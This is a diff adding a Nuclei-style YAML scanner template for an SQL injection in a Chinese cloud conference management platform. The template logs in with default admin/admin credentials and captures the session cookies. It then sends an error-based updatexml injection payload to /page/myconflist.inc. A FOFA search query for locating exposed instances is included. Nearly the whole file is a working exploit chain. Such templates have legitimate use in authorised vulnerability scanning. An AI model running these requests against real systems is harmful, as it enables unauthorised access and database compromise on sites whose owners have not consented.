@@ -1,0 +1,56 @@
+id: poc-yaml-hwactive-myconflist-inc-sqli
+info:
+  name: \u534E\u671B\u4E91\u4F1A\u8BAE\u7BA1\u7406\u5E73\u53F0 myconflist.inc SQL\u6CE8\u5165\u6F0F\u6D1E
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    product: \u534E\u671B\u4E91\u4F1A\u8BAE\u7BA1\u7406\u5E73\u53F0
+    fofa-query: title="\u534E\u671B\u4E91\u4F1A\u8BAE\u7BA1\u7406\u5E73\u53F0"
+flow: |
+  http(1) && http(2)
+http:
+  - raw:
+      - |
+        POST /ajax/userlogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        userNameCopy=admin&userName=admin&passWordCopy=admin&passWord=21232f297a57a5a743894a0e4a801fc3
+    extractors:
+      - type: regex
+        name: uid
+        internal: true
+        part: header
+        regex:
+          - "uid=(.*?);"
+      - type: regex
+        name: cookie
+        internal: true
+        part: header
+        regex:
+          - "JSESSIONID=(.*?);"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /page/myconflist.inc?search=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+md5(1))),1))+and+'%25%25'+like+'&params[]=confName&params[]=confId&selectTime=1 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: uid={{uid}}; JSESSIONID={{cookie}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "XPATH syntax error"
+          - "java.sql.SQLException"
+          - "c4ca4238a0b923820dcc509a6f75849b"
